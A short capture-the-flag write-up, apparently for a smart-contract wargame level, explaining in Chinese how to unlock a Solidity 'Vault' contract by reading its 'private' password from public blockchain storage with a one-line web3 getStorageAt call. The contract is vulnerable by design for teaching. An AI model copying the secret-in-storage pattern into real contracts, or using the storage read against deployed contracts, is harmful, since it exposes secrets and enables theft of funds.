## 0x01 Task

Unlock the vault to pass the level!

```javascript
pragma solidity ^0.4.18;

contract Vault {
  bool public locked;
  bytes32 private password;

  function Vault(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

## 0x02 Solution

合约逻辑很简单，需要知道 `password` 来解锁合约，而 `password` 属性设置了 `private`，无法被其他合约直接访问。

解决该问题的关键点在于，这是一个部署在区块链上的智能合约，而区块链上的所有信息都是公开的。

可以用 `getStorageAt` 函数来访问合约里变量的值。合约里一共两个变量，`password` 第二个声明，position 为 1。翻一下文档，`getStorageAt` 函数需要带上回调函数，可以选择直接把返回结果 alert 出来。

```javascript
web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(web3.toAscii(y))});
```

